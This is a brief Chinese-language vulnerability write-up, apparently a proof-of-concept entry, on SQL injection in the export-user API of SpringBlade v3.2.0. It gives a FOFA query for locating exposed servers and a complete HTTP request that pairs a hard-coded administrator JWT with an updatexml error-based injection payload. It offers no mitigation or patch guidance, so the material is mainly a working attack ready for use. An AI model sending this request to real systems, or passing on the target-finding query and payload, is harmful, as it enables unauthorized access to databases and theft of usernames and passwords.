# SpringBlade export-user 存在 SQL注入漏洞

# 一、漏洞简介
SpringBlade v3.2.0 及之前版本框架后台 export-user 路径存在安全漏洞，攻击者利用该漏洞可通过组件customSqlSegment 进行SQL注 入攻击，攻击者可将用户名、密码等敏感信息通过 excel 导出。

# 二、影响版本
+ SpringBlade v3.2.0

# 三、资产测绘
+ fofa`body="[https://bladex.vip"](https://bladex.vip") && title!="融媒体中心后台管理系统" && title!="尚牛电竞运营后台"`
+ 特征

![1703260241729-c77ed022-a493-4621-983c-5ec64ddbde71.png](./img/_NYAM1MaHtnpei3i/1703260241729-c77ed022-a493-4621-983c-5ec64ddbde71-917073.png)

# 四、漏洞复现
```java
GET /api/blade-user/export-user?Blade-Auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ&account&realName&1-updatexml(1,concat(0x7e,(select+@@version),0x7e),1)=1 HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![1703260289968-ee5e0878-4c51-4107-a3a4-f5f6fe02e2f3.png](./img/_NYAM1MaHtnpei3i/1703260289968-ee5e0878-4c51-4107-a3a4-f5f6fe02e2f3-416322.png)



> 更新: 2024-12-13 17:10:57  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xgx1k1ortg8i6rp0>